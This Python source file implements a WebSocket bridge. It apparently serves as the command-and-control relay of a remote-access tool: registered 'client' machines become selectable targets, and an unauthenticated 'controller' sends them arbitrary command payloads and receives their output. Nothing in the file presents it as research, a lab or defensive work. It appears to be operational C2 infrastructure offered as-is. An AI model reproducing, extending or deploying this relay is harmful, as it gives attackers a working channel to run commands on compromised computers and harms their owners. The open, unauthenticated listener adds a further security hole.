import os
import asyncio
import websockets
import json

connections = {}
client_count = 0
server_count = 0

async def handle_connection(websocket, path=None):
    global client_count, server_count
    identity = None
    assigned_target = None
    
    try:
        # Initial handshake frame dictates type
        handshake = await websocket.recv()
        handshake = handshake.strip().upper()
        
        if handshake == "CLIENT":
            client_count += 1
            identity = f"client{client_count}"
            connections[identity] = websocket
            print(f"Registered Client Endpoint: {identity}")
            await websocket.wait_closed()
            
        elif handshake == "SERVER":
            server_count += 1
            identity = f"server{server_count}"
            print(f"Registered Controller Endpoint: {identity}")
            
            async for message in websocket:
                try:
                    data = json.loads(message)
                    action = data.get("action")
                    
                    if action == "list":
                        clients = [k for k in connections.keys() if k.startswith("client")]
                        await websocket.send(json.dumps({"type": "menu", "data": clients}))
                        
                    elif action == "select":
                        target_name = data.get("target")
                        if target_name in connections:
                            assigned_target = target_name
                            await websocket.send(json.dumps({"type": "status", "data": f"Selected target {target_name}"}))
                        else:
                            await websocket.send(json.dumps({"type": "status", "data": "Target offline"}))
                            
                    elif action == "cmd":
                        payload = data.get("payload")
                        if assigned_target and assigned_target in connections:
                            # Deliver string command directly to target client
                            await connections[assigned_target].send(payload)
                            # Receive unified response frame and bounce straight back to controller
                            response = await connections[assigned_target].recv()
                            await websocket.send(json.dumps({"type": "output", "data": response}))
                        else:
                            await websocket.send(json.dumps({"type": "status", "data": "No target selected or target offline"}))
                except Exception as e:
                    print(f"Error parsing structural payload: {e}")
                    
    except Exception as e:
        print(f"Connection closed for {identity}: {e}")
    finally:
        if identity in connections:
            del connections[identity]
            print(f"Deregistered: {identity}")

async def main():
    port = int(os.environ.get("PORT", 5555))
    async with websockets.serve(handle_connection, "0.0.0.0", port):
        print(f"WebSocket Bridge running on port {port}...")
        await asyncio.Future()

if __name__ == "__main__":
    asyncio.run(main())
